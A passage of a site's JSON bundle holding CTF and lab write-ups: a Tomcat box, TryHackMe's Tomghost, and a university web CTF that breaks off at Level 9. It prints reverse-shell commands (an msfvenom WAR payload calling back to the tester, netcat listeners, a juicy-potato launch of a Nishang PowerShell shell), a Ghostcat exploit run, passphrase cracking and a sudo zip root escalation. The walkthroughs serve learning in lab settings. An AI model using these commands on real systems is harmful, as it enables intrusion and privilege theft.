2.4.43","chisel","cloudme 1.11.2","curl","download file","nsfvenom","port forwarding","powershell iwr","windows","winpeas","Gym Manager 1.0","privesc"],"date":"SEPT 2024","location":"./writeup/","banner":"writeup/tomcat/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Scanning the network /24 finding the host exposing posts 22 SSh, 135 msrpc, 139 netbios-ssn, 445 microsoft-ds?, 3389 ssl/ms-wbt-server?, 8080 http, 49154 msrpc, 49155 msrpc and 49156 msrpc"},{"section":"Tomcat credentials","description":"Accessing Tomcat admin panel with default credentials"},{"section":"Reverse shell","description":"Exploying a reverse shell with a malicious .war file generated with msfvenom to exploit Apache Server"},{"section":"Reverse shell","description":"Executing the reverse shell by visiting the .war file upload path and receiving the connection back to the Netcat (nc) listener"},{"section":"Reverse shell","description":"Listin the tasks of the target machine from CMD"},{"section":"Missconfigurations","description":"Discovering SeImpersonatePrivilege missconfiguration"},{"section":"Privilege escalation","description":"Privilege escalation (PrivEsc) with Jucy-Potato by executing it give as paramenter the Nihsang shell"},{"section":"Privilege escalation","description":"Downloading the reverse shell with Python web server into the target machine"}],"body":[{"id":"Ignite","title":"<h1> <span style=\\"color:#da1953\\">Tom</span>cat</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/tomcat/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<p>Enumerating <em>192.169.22.100/24</em> to find the host running Apache with nmap <code>nmap -sC -sV 192.168.22.100/24</code>. After the Apache scan it appears to be running on <em>192.168.22.150</em>.</p>","<p><pre>Nmap scan report for 192.168.22.150<br>Host is up (0.042s latency).<br>Not shown: 991 filtered ports<br>PORT      STATE SERVICE            VERSION<br>22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 6f:b4:44:da:96:20:97:54:e8:1a:9e:61:96:8f:da:95 (RSA)<br>|   256 87:ac:a8:b4:fa:2f:bd:e5:35:15:c1:01:5c:8d:e7:fd (ECDSA)<br>|_  256 aa:7b:1c:8c:1a:52:b3:40:a8:0e:47:c9:c9:e0:a5:ba (ED25519)<br>135/tcp   open  msrpc              Microsoft Windows RPC<br>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds?<br>3389/tcp  open  ssl/ms-wbt-server?<br>| rdp-ntlm-info: <br>|   Target_Name: UK<br>|   NetBIOS_Domain_Name: UK<br>|   NetBIOS_Computer_Name: TOMCAT<br>|   DNS_Domain_Name: uk.mwr.com<br>|   DNS_Computer_Name: TOMCAT.uk.mwr.com<br>|   DNS_Tree_Name: mwr.com<br>|   Product_Version: 6.3.9600<br>|_  System_Time: 2021-06-05T13:08:40+00:00<br>| ssl-cert: Subject: commonName=TOMCAT.uk.mwr.com<br>| Not valid before: 2021-01-28T11:47:11<br>|_Not valid after:  2021-07-30T11:47:11<br>8080/tcp  open  http               Apache Tomcat 8.5.50<br>|_http-favicon: Apache Tomcat<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-title: Apache Tomcat/8.5.50<br>49154/tcp open  msrpc              Microsoft Windows RPC<br>49155/tcp open  msrpc              Microsoft Windows RPC<br>49156/tcp open  msrpc              Microsoft Windows RPC<br>MAC Address: 00:15:5D:15:04:02 (Microsoft)<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br></pre></p>"]},{"id":"Tomcat credentials","title":"<h1><span style=\\"color:#da1953\\">Tom</span>cat credentials</h1>","body":["<p>The default credentials are <b>tomcat:tomcat</b> which I guessed tried some common combination of username and password.</p>"]},{"id":"Reverse shell","title":"<h1><span style=\\"color:#da1953\\">Rev</span>erse shell</h1>","body":["<p>To be able to see under which user the Tomcat service is running I need to have access to the server. Since I have access to the Tomcat Manager page, I can upload a malicious war file to get a reverse shell.</p>","<p>To create the malicious war file, I use the following command: <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.22.2 LPORT=4444 -f war &gt; shell.war</code> Where the IP is the one assigned to me at the interface Tap0 and a port of my choice.</p>","<p><img src=\\"/cyber/writeup/tomcat/8213f2c1eb5549339e6b0b773ce64c6e.png\\"></p>","<p>Now I must listen to the port chosen by me (4444) waiting for the incoming connection upon uploading the malicious war file, in order to receive the conneciton I have to execute the following commands <code>nc -lvp 4444</code>.</p>","<p><img src=\\"/cyber/writeup/tomcat/e7893a774fbb4eeea8e8b2edd5f2036e.png\\"></p>","<p>From the Tomcat manager page, I must upload the malicious war file created.</p>","<p><img src=\\"/cyber/writeup/tomcat/64642cbd358b4f7cb7605045a0803267.png\\"></p>","<p>To get a connection I must navigate to the path where the file was uploaded by clicking the link or writing the URL in the browser. In this way the malicious code inside the war file will be executed and it will try to connec to the given IP and PORT.</p>","<p><img src=\\"/cyber/writeup/tomcat/fdfaa8c703c04b1ea4d5db63fefca8cb.png\\"></p>","<p><img src=\\"/cyber/writeup/tomcat/2c61db120a9443f4bc3b02d350aea0d9.png\\"></p>","<p>At this point, I have a connection and I am given a shell.</p>","<p><img src=\\"/cyber/writeup/tomcat/83059155708a4a9a8477ba957ec456f0.png\\"></p>","<p>Now finally I can check under which user the service Tomcat is running. To see the list of processes I ran the command <code>tasklist /V</code>, and the Tomcat service appears to be run by <em>AUTHORITY\\\\LOCAL SERVICE</em> which does not have elevated privilege.</p>","<p><img src=\\"/cyber/writeup/tomcat/9d804782f597427d9f3b13652f9eeddb.png\\"></p>",""]},{"id":"Missconfigurations","title":"<h1><span style=\\"color:#da1953\\">Mis</span>sconfigurations</h1>","body":["<p>After searching for a misconfiguration I found that <em>SeImpersonatePrivilege</em> is enabled by russing <code>whoami /all</code>.</p>","<p><img src=\\"/cyber/writeup/tomcat/661371e0a3c34651a8c5fdc3dfb5a78c.png\\"></p>","<p>So now I can try some tools to gain privileged access to the box.</p>"]},{"id":"Privilege escalation","title":"<h1><span style=\\"color:#da1953\\">Pri</span>vilege escalation</h1>","body":["<p>In order to read the flag.txt file I had to privilege escalation since the normal shell did not  me to read it and did not have the permissions. To do privilege escalation I used a tool called <em>juicy-potato</em>. Before running this tool, I had to prepare a reverse PowerShell and a Nihsang shell obtained from <a data-from-md title=\'https://github.com/samratashok/nishang\' href=\'https://github.com/samratashok/nishang\'>GitHub</a>. The shell in question is called <em>Invoke-PowerShellTcp.ps1</em> to which I set the parameters as follows.</p>","<p><img src=\\"/cyber/writeup/tomcat/a32de62d8bc54dc092fb5c4e2b4a5b29.png\\"></p>","<p>The IP address is the IP address assigned to my tap0 interface while the port is my choice.</p>","<p><img src=\\"/cyber/writeup/tomcat/0adcf3fa59074225a5dde9f087010cb6.png\\"></p>","<p>Also, I have prepared a bat file that runs the reverse PowerShell in the following way: <code>powershell.exe -ExecutionPolicy Unrestricted -Command &quot;C:\\\\Users\\\\Public\\\\Downloads\\\\rev.ps1&quot;</code></p>","<p><img src=\\"/cyber/writeup/tomcat/96016da9af7a4da8a4b3f8d8130e72d5.png\\"></p>","<p>Remember to use an absolute path otherwise, it might not work! Then I uploaded the juicy-potato, reverse PowerShell and the bat file to the server via the Python webserver.</p>","<p><img src=\\"/cyber/writeup/tomcat/3632eb85dedf4edc9a06dcf2933aafbb.png\\"></p>","<p><img src=\\"/cyber/writeup/tomcat/fcfafd6879ba43d6b046a8d9c2daca90.png\\"></p>","<p>After obtaining all the three necessary elements, I used juicy-potato (renamed as j.exe) to create an elevated process that reconnected to my listening netcat in order to obtain a privileged reverse shell. <code>j.exe -t * -p C:\\\\Users\\\\Public\\\\Downloads\\\\rev.bat -l 9001</code> Note that here port 9001 doesn\'t matter so I can put whatever I want</p>","<p><img src=\\"/cyber/writeup/tomcat/813cc540a1c448ac85eee6695ce28b79.png\\"></p>","<p><img src=\\"/cyber/writeup/tomcat/18d8f9083d0f4719b72d0b21b032e1dc.png\\"></p>"]}]}]}')},1904:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Tomghost","path":"tomghost","tags":["easy","ctf","oscp","box","thm","cve","ssh","bruteforcing","python webserver","download file","privesc","pgp public key cracking"],"date":"NOV 2024","location":"./writeup/","banner":"writeup/tomghost/banner.gif","type":"writeup","search":[{"section":"Scanning","description":"Scanning with nmap and finding the host exposing posts 22 SSh, 53 tcpwrapped, 8009 ajp13, 8080 http"},{"section":"Enumeration","description":"Enumerating port 8009 ajp13 Apache Jserv (Protocol v1.3) finding publicly availavle Ghostcat CVE-2020-10487"},{"section":"Exploitation","description":"Downloading exploit via searchsploit"},{"section":"Exploitation","description":"Manual exploitaiton with Ghostcat CVE of Apacke Jserv (Protocol v1.3) extracting WEB-INF/web.xml file containing credentals"},{"section":"Exploitation","description":"Log in with ssh username and credential"},{"section":"Privilege Escalation","description":"Downloading .pgp and .asc files with Python3 web server"},{"section":"Privilege Escalation","description":"Extracting passphrase hash from PGP public key (.asc) file with pgp2john and cracking it with John The Ripper"},{"section":"Privilege Escalation","description":"Decrypting credential contained in encrypted .pgp file with passphrase previewsly cracked"},{"section":"Privilege Ecalation","description":"Lateral movement by loggin as a different user with ssh username and passowrd"},{"section":"Privilege Escalation","description":"Exploiting zip program elevating privilege to root"}],"body":[{"id":"Ignite","title":"<h1> <span style=\\"color:#da1953\\">Tom</span>ghost</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/tomghost/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<p><pre>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 09:30 EST<br>Nmap scan report for 10.10.26.184<br>Host is up (0.027s latency).<br>Not shown: 996 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)<br>|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)<br>|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)<br>53/tcp   open  tcpwrapped<br>8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)<br>| ajp-methods: <br>|_  Supported methods: GET HEAD POST OPTIONS<br>8080/tcp open  http       Apache Tomcat 9.0.30<br>|_http-title: Apache Tomcat/9.0.30<br>|_http-favicon: Apache Tomcat<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds<br></pre></p>","<p>I have four services: port 22 SSH, 53 TCP wrapper, 8009 AJP13 (Apache Jsever), and 8080 Tomcat. The next step is to enumerate each of them with lots of patient.</p>"]},{"id":"Enumeration","title":"<h1><span style=\\"color:#da1953\\">Enu</span>meration</h1>","body":["<p>Due to my past experience with Tomcat vulnerabilities, I assumed it was the same challenge: bypassing the admin panel and uploading a web shell to access the server. Big mistake!</p>","<p>Due to this wrong assumption, I started enumerating Tomcat port 8080 and discovered that the admin panel was disabled from the configuration file. For some reason, I was fixated on the idea that the vulnerability was in the Tomcat service and from the enumerating phase I slid into the exploitation phase without even noticing. Second big mistake!</p>","<p><img src=\\"/cyber/writeup/tomghost/bigmistake.jpg\\"></p>","<p>Luckily I took a break and after clearing my mind I decided to proceed with the second service starting from the bottom up. The next service is port 8009 Apache Jserver. What I usually do is use <a href=\\"https://book.hacktricks.wiki/en/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.html?highlight=8009#8009---pentesting-apache-jserv-protocol-ajp\\">HackTricks</a> for the enumeration phase and it describes a vulnerability named Ghostcat, the same as the challenges banner. Fantastic!</p>","<p><img src=\\"/cyber/writeup/tomghost/yes.jpg\\"></p>","<p>At this point, I stopped the enumeration phase and proceeded with the exploitation phase as there is a public CVE to use.</p>","<p><img src=\\"/cyber/writeup/tomghost/earchsploit.PNG\\"></p>","<p>I tend to avoid using Metasploit as a simulation of different certifications where the tool is banned or limited, for this reason, I used the first option <i>48143.py</i> and trained manual exploitation.</p>","<p>Note that even if I stopped the enumeration phase and skipped port 22 and port 53 this is the wrong way to approach boxes, it is always suggested to complete the enumeration phase as none guarantees that the exploit I found is going to work, be aware of rabbit holes! Always always complete your enumeration at your best!</p>"]},{"id":"Exploitation","title":"<h1><span style=\\"color:#da1953\\">Exp</span>loitation</h1>","body":["<p>First, this to do is to copy the exploit and open it to understand what it is doing. This is crucial, especially in real-life penetration testing where there is a risk of introducing vulnerabilities or causing unintentional damage to the server, especially if you testing the production server!</p>","<p><code>searchsploit -m 48143.py</code></p>","<p>Once opened the Python file, at the bottom of the file, which usually is the starting point (main) of the program I can see what is required to run it and what arguments it takes.</p>","<p><img src=\\"/cyber/writeup/tomghost/cvecode.PNG\\"></p>","<p>It becomes clear that there are 2 parameters set by default: the port and the file to extract,  the only parameter I have to provide is the remote IP address. This script must be run with Python2 otherwise it generates an error as starting from Python3 some library has changes and its syntax.</p>","<p><pre>chmod +x 48143.py<br>python2 ./48143.py [target.ip.address]</pre></p>","<p><img src=\\"/cyber/writeup/tomghost/cred.PNG\\"></p>","<p>Now we have a credential, what is it for? ssh maybe? Let\'s try the following command: <code>ssh skyfuck@[target.ip.address]</code> and as a passowrd use the one from the extracted file.</p>","<p><img src=\\"/cyber/writeup/tomghost/remoteshell.PNG\\"></p>","<p><img src=\\"/cyber/writeup/tomghost/imin.png\\"></p>","<p>The user flag is in the <b>merlin</b> home directory</p>","<p><img src=\\"/cyber/writeup/tomghost/userflag.PNG\\"></p>"]},{"id":"Privilege Escalation","title":"<h1><span style=\\"color:#da1953\\">Pri</span>vilege Escalation</h1>","body":["<p>Once inside I listed the files in the current directory (home directory of skyfuck) and saw a pgp file named credential and a public key (.asc). Thanks to other CTFs I did in past I knew how to deal with these files. The foremost thing to do is to crack the passphrase from the encrypted (tryhackme.asc) file and use that to decrypt <i>credential.pgp</i>.</p>","<p>Remember that in this case, I am again skipping the whole enumeration of the system as I was presented with those 2 files, and my plan was to proceede with complete enumeration in the even the decryption attemps fails and it is a rabbit hole.</p>","<p>Before attempting to crack the password, I must download the files, as the necessary tools may not be installed on the target machine. For this reason, I opened a Python web server on the target machine, downloaded the necessary files, and performed the cracking on my local machine.</p>","<p>On the target machine:</p>","<p><pre>python3 -m http.server</pre></p>","<p><img src=\\"/cyber/writeup/tomghost/webserver.PNG\\"></p>","<p></p>","<p>On my local Kali machine:</p>","<p><pre>wget http://[target.ip.address]:8000/credential.pgp<br>wget http://[target.ip.address]:8000/tryhackme.asc</p>","<p><img src=\\"/cyber/writeup/tomghost/download.png\\"></p>","<p>To decrypt the tryhackme.asc file I have to use <b>pgp2john</b> to extract the hash and then use <b>JohnTheRipper</b> to crack it.</p>","<p><pre>pgp2john tryhackme.asc > hash<br>john --wordlist=/user/share/wordlist/rockyou.txt hash</pre></p>","<p><img src=\\"/cyber/writeup/tomghost/cracked.PNG\\"></p>","<p>Next step is to import the <i>tryhackme.asc</i> file: <code>gpg --import tryhackme.asc</code> when prompterd enter the phassphrase <i>alexandru</i>.</p>","<p><img src=\\"/cyber/writeup/tomghost/importkey.PNG\\"></p>","<p>Now decryt the file as: <code>gpg --recipient \\"John Doe &lt;john.doe@example.com&gt;\\" --output decrypted_file.txt --decrypt credential.pgp</code> and when prompted enter the passphrase.</p>","<p><img src=\\"/cyber/writeup/tomghost/passphrase.PNG\\"></p>","<p><img src=\\"/cyber/writeup/tomghost/decryption.png\\"></p>","<p>Now this is the ssh credential for <i>merlin</i> account, and similarly, we can log in to <i>merlin</i> and try to elevate our privilege. This is also a sort of lateral movement. The reason why I had to change account it is because as <i>skyfuck</i> user I am not able to elevate my privilege due to its restriction in the system, on the other hand <i>merlin</i> is not as restricted as <i>skyfuck</i> leaving the possibility to compromise the system.</p>","<p>Log in as <i>merlin</i>: <code>ssh merlin@[target.ip.address]</code></p>","<p><img src=\\"/cyber/writeup/tomghost/merlin.PNG\\"></p>","<p>Upon log in I can see that <i>melin</i> account can run <i>/usr/bin/zip</i> as <b>root</b>, and to check if it is exploitable I used <a href=\\"https://gtfobins.github.io/gtfobins/zip/\\">gtfobin</a> and searched for <b>zip</b>. Among the different solutions, I chose the sudo one as the user merlin can execute it with sudo privilege, so I am executing in order the following 2 commands:</p>","<p><pre>TF=$(mktemp -u)<br>sudo zip $TF /etc/hosts -T -TT \'sh #\'</pre></p>","<p><img src=\\"/cyber/writeup/tomghost/root.PNG\\"></p>"]}]}]}')},3591:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"University CTF","path":"uni-ctf","tags":["medium","ctf","web","security","sqli","shellshock","http header","code injection","bruteforcing","rot13","login panel"],"date":"MAY 2020","location":"./writeup/","banner":"writeup/unictf/banner.webp","type":"writeup","search":[{"section":"Level 1 - Password validation","description":"Inspected the source code to find the password validation function to retrieve hard-coded credentials"},{"section":"Level 2 - Stop!","description":"Inspected the source to find the password in the alt value of the image"},{"section":"Level 3 - Password verification","description":"Inspected the source code and enabled the hidden input to become administrator"},{"section":"Level 4 - Secure Browser","description":"Impersonated a different browser by changing the \\"user-agent\\" and \\"referrer\\" headers"},{"section":"Level 5 - Headers","description":"Changed the \\"referrer\\" header to get the flag"},{"section":"Level 6 - Your personal secret","description":"Changed to \\"uid\\" parameter in the URL to find the admin page and the flag"},{"section":"Level 7 - Password protected","description":"Guessed login credentials by using teacher\'s email as username"},{"section":"Level 8 - Your persona secret pt.2","description":"Used ROT13 to decrypt the \\"user\\" parameter in the URL and encrypt the \\"admin\\" value to access the admin page"},{"section":"Level 9 - Password protected pt.2","description":"Inspected the source code to find in a comment the file \\"session.txt\\" containing the active admin session. Updated the current cookie session to access as admin"},{"section":"Level 10 - Bytestream","description":"Inspected the source code and found the MD5 hash of the password and decrypted it to access as admin"},{"section":"Level 11 - Brutus system","description":"Inspected the source code and found the password check function. Reverse engineered the function logic and implemented a Python function to decrypt the password"},{"section":"Level 12 - PHP","description":"Inspected the code and found the PHP filter vulnerable to bash injection, bypasses the restriction, obtained RCE - remote code execution to retrieve the flag"},{"section":"Level 13 - Bash Environment","description":"Exploited shellshock vulnerability to bypass the PHP filter and obtain RCE - remote code execution to retrieve the flag"},{"section":"Level 14 - SQL Injection","description":"Employed manual SQL Injection (SQLi) to exfiltrate admin credentials"}],"body":[{"id":"University web CTF","title":"<h1> <span style=\\"color:#da1953\\">Uni</span>versity web CTF </h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/unictf/banner.webp\\" alt=\\"\\"><hr>"]},{"id":"Introduction","title":"<hr><h2> <span style=\\"color:#da1953\\">Int</span>roduction </h2>","body":["<p>This was my university CTF during my Masters\' degree in Cybersecurity, we compeeted in team and I was paired with one of my university colleague and friend and we completed all the challenges. At that time I was at the start of my journe in the Cybersecurity field, even if now theese challenges seels really easy at during that period was enlighting and they tought me many things about web and web security.</p>","<p>This writeup is written in a way to show not only the solution but also my process and my thinking behind and action. I believe that learning skills is relatively easy thanks to various resources available for free but the hardest part is to have the right mindset to approach the challenges.</p>","<hr>"]},{"id":"Level 1 - Password validation","title":"<h2> <span style=\\"color:#da1953\\">Lev</span>el 1 - Password validation </h2>","body":["<p>The URL of the first level was given as the starting point:</p>","<p><code>http://eth-lab.di.uniroma1.it:55001/eishohwohpahxooy/</code></p>","<p>As stated during the Web Security Challenges lectures, the first thing to do when trying to hack a web page was to actually use the web page as it was supposed to be used. So, in other words, you simply do what the web page asks you to do.</p>","<p>Therefore, we first tried to log in by inserting a random username and password, as requested from the web page itself.</p>","<p><img src=\\"/cyber/writeup/unictf/image18.png\\" alt=\\"\\"></p>","<p>As we expected we received an error:</p>","<p><img src=\\"/cyber/writeup/unictf/image28.png\\" alt=\\"\\"></p>","<p>Then, we tried to dig further inspecting the web page&rsquo;s source code.</p>","<p><img src=\\"/cyber/writeup/unictf/image63.png\\" alt=\\"\\"></p>","<p>We observed  in the form above that on clicking Submit we actually call a function named <em>verify</em>.</p>","<p>So, we started looking for a function called verify in the Console section (right click - inspect element).</p>","<p><img src=\\"/cyber/writeup/unictf/image43.png\\" alt=\\"\\"></p>","<p>As seen from the picture above, we found the function Verify. Now jumping into the definition of the function, to check in detail what was the Verify function supposed to do.</p>","<p><img src=\\"/cyber/writeup/unictf/image64.png\\" alt=\\"\\"></p>","<p>I was in plaintext in the <code>if</code> condition highlighted in red, the password and the username needed in order to access the web page.</p>","<p><img src=\\"/cyber/writeup/unictf/image86.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 2 - Stop!","title":"<h2 id=LV2> <span style=\\"color:#da1953\\">Lev</span>el 2 - Stop!</h2>","body":["<p>Once solved the Level 1, the URL of the second level was found:</p>","<p><code>http://eth-lab.di.uniroma1.it:55043/zeitaeveishiidef</code></p>","<p>This was how the Level 2 looked like:</p>","<p><img src=\\"/cyber/writeup/unictf/image67.png\\" alt=\\"\\"></p>","<p>In this level there was only the possibility to insert a password, there was no username. So, let&rsquo;s try to insert a random password.</p>","<p><img src=\\"/cyber/writeup/unictf/image72.png\\" alt=\\"\\"></p>","<p>Well, wrong password! As done in the previous level, we tried to look further by analyzing the source code.</p>","<p><img src=\\"/cyber/writeup/unictf/image70.png\\" alt=\\"\\"></p>","<p>Reading the first lines we could clearly see that there was a function implementation, the function seems to encrypt the text inserted in the password field, with MD5 function. The first idea was to decrypt what seems to be a ciphertext in the <code>if</code> condition.</p>","<p>After using numerous MD5 online decrypters without success, we decide to keep on reading the source code. While having a closer look at it, we noticed two images references in the inspector section: one was a reference to the picture in the home page &ldquo;kitten.jpg&rdquo; and the other one was a picture with a hidden parameter &ldquo;srct.png&rdquo;.</p>","<p>Putting the cursor on top of the reference <em>scrt.png</em> a window popped up with a text.</p>","<p><img src=\\"/cyber/writeup/unictf/image77.png\\" alt=\\"\\"></p>","<p>The text on the picture was the right password to insert in order to solve the level.</p>","<hr>"]},{"id":"Level 3 - Password verification","title":"<h2> <span style=\\"color:#da1953\\">Lev</span>el 3 - Password verification</h2>","body":["<p>As usual, in the previous level, we found the link to access the next one:</p>","<p><code>http://eth-lab.di.uniroma1.it:55208/bahjeighahveerae/cgi-bin/index.php</code></p>","<p>As tried before, as a first step when trying to relate to a new web page, we tried to follow the natural instructions of the web page itself, this time trying to insert a username and password. We decided to try with some random and basic combination of username and password (e.g. <em>admin:admin</em>).</p>","<p>As we expected, we received the following error message:</p>","<p><img src=\\"/cyber/writeup/unictf/image73.png\\" alt=\\"\\"></p>","<p>So, we analyzed the source code once again.</p>","<p><img src=\\"/cyber/writeup/unictf/image75.png\\" alt=\\"\\"></p>","<p>In the source code, we found a hidden parameter with a “False” value, we inspected the web page source code proceeded by changing the value from False to True, and submitted the form.</p>","<p><img src=\\"/cyber/writeup/unictf/image78.png\\" alt=\\"\\"></p>","<p>After applying the above-mentioned changes, we finally obtaine the page with the URL of the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image80.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 4 - Secure Browser","title":"<h2> <span style=\\"color:#da1953\\">Lev</span>el 4 - Secure Browser</h2>","body":["<p>This was the URL for the Level 4:</p>","<p><code>http://eth-lab.di.uniroma1.it:55192/ogheucaiheikohhi</code></p>","<p><img src=\\"/cyber/writeup/unictf/image82.png\\" alt=\\"\\"></p>","<p>This level consisted of verifying our browser in order to have access.</p>","<p><img src=\\"/cyber/writeup/unictf/image84.png\\" alt=\\"\\"></p>","<p>Only connections from <em>Kevin Browser Rocks</em> were accepted.</p>","<p>What we had to do was to pretend to be using the browser “Kevin Browser Rocks” by changing the headers in our browser. In order to do that we useded an extension (Simple Modify Headers, on Firefox) that modifies the header and we set it up to do it during the requests.</p>","<p><img src=\\"/cyber/writeup/unictf/image87.png\\" alt=\\"\\"></p>","<p>As we can see we modified our browser <code>user-agent</code> to <em>Kevin Browser Rocks</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image89.png\\" alt=\\"\\"></p>","<p>Nice! Now the page accepted only connections from Russian (.ru) websites. We have our extension and we can also use it to simulate Russian connection by changing our browser referrer.</p>","<p><img src=\\"/cyber/writeup/unictf/image89.png\\" alt=\\"\\"></p>","<p>By applying this new change, we could finally get the URL to access the new level.</p>","<p><img src=\\"/cyber/writeup/unictf/image90.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 5 - Headers","title":"<h2> <span style=\\"color:#da1953\\">Lev</span>el 5 - Headers</h2>","body":["<p>This was the URL obtained to access the fifth level:</p>","<p><code>http://eth-lab.di.uniroma1.it:55051/iengohquoochieza/</code></p>","<p><img src=\\"/cyber/writeup/unictf/image47.png\\" alt=\\"\\"></p>","<p>The first thing we did was to analyze the source code.</p>","<p><img src=\\"/cyber/writeup/unictf/image49.png\\" alt=\\"\\"></p>","<p><em>“Never show secret.txt to the users”</em>, this caught our attention so we searched for the file called: <em>secret.txt</em>, in the current web directory. As we knew the URL was nothing else than a path to a file in a webserver, and we added <em>secret.txt</em> to the urr to the URL in order to find it.</p>","<p><img src=\\"/cyber/writeup/unictf/image51.png\\" alt=\\"\\"></p>","<p>At this point, we needed to find the secret at <em>cgi-bin/getsecret.js</em> and referred to ourselves as <em>di.uniroma1.it/supersecurepage</em>, which could be done with the Firefox extension as done in the previous levels.</p>","<p><img src=\\"/cyber/writeup/unictf/image53.png\\" alt=\\"\\"></p>","<p>After having done this, we were able to find the URL to the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image55.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 6 - Your personal secret","title":"<h2> <span style=\\"color:#da1953\\">Lev</span>el 6 - Your personal secret</h2>","body":["<p>The URL for the level 6 obtained by solving the level 5:</p>","<p><code>http://eth-lab.di.uniroma1.it:55005/oaxiweitheerohra</code></p>","<p><img src=\\"/cyber/writeup/unictf/image57.png\\" alt=\\"\\"></p>","<p>Here we applied the usual method of trying one of the most common combination of username and password (admin:admin).</p>","<p><img src=\\"/cyber/writeup/unictf/image59.png\\" alt=\\"\\"></p>","<p>Digging in the source code and reading it did not reveal anything. So, we turned our attention to the URL, and we found a reference to a PHP script with the field <em>uid</em> exposed <em>userinfo.php?uid=0</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image60.png\\" alt=\\"\\"></p>","<p>The field was set to 0 which was our current user’s ID, so we tried to change it with 1 and we were sent to another web page, Angelo\'s web page. Then we started to change the value of uid until we found the user with the secret at <em>uid=6</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image61.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 7 - Password protected","title":"<h2 id=LV7> <span style=\\"color:#da1953\\">Lev</span>el 7 - Password protected</h2>","body":["<p>The URL found by solving level 6:</p>","<p><code>http://eth-lab.di.uniroma1.it:55215/shieduekecometha/</code></p>","<p><img src=\\"/cyber/writeup/unictf/image62.png\\" alt=\\"\\"></p>","<p>As stated in the picture, in order to log in we need an e-mail and the username.</p>","<p><img src=\\"/cyber/writeup/unictf/image24.png\\" alt=\\"\\"></p>","<p>So, we tried a fake and random email and a random string as a password. At that point, we noticed that the site check if the username was an e-mail just by checking if the username string contained the character <em>@</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image26.png\\" alt=\\"\\"></p>","<p>We could try to insert any kind of random email for instance <em>admin@admin</em> or even <em>teacher@something</em> but we always received the same kind of message. After having tried some standard types of email, we thought that we could try by inserting a real teacher’s email address.</p>","<p>Our first attempt was to try with course main teacher&rsquo;s email but it was not the right solution. Then we tried again with our laboratorys teacher&rsquo;s email and finally, that one was the key solution for the next level because we were able to log in as a teacher and consequently obtain the link for the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image29.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/writeup/unictf/image31.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 8 - Your persona secret pt.2","title":"<h2 id=LV8> <span style=\\"color:#da1953\\">Lev</span>el 8 - Your persona secret pt.2</h2>","body":["<p>Let’s start with the URL obtained from the previous levels:</p>","<p><code>http://eth-lab.di.uniroma1.it:55493/zangiepaegaizeex/cgi-bin/index.php</code></p>","<p><img src=\\"/cyber/writeup/unictf/image33.png\\" alt=\\"\\"></p>","<p>Our first attempt was as usual the standard combination of <em>admin:admin</em> as username and password.</p>","<p><img src=\\"/cyber/writeup/unictf/image35.png\\" alt=\\"\\"></p>","<p>And we noticed a code in the URL which should be the ID of the current user.</p>","<p><img src=\\"/cyber/writeup/unictf/image37.png\\" alt=\\"\\"></p>","<p>We tried to figure it out why the current user (admin) has that precise value, and we also noticed that the string <em>admin</em> and the string <em>nqzva</em> had the same length, so we started to match the characters from the first string with the ones from the other string hence <em>a=n</em>, <em>d=q</em>.</p>","<p>We immediately notice that the distance between the characters was 13, so we tried to ROT13 the string <em>admin</em> and the result string was <em>nqzva</em>.</p>","<p>After many random tries, our attention was captured by the sentence <em>“Page created by MessyAdmin”</em> present on the first page of the level.</p>","<p>So, we decide to ROT13 the string <em>messyadmin</em> which resulted in <em>zrfflnqzva</em> which has been copied and pasted to the URL instead of <em>nqzva</em> and we ended up with the MessyAdmin’s page where we found the link to the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image38.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/writeup/unictf/image39.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 9 - Password protected pt.2","title":"<h2 id=LV9> <span style=\\"color:#da1953\\">Lev</span>el 9 - Password protected pt.2</h2>","body":["<p>URL obtained from the 8th 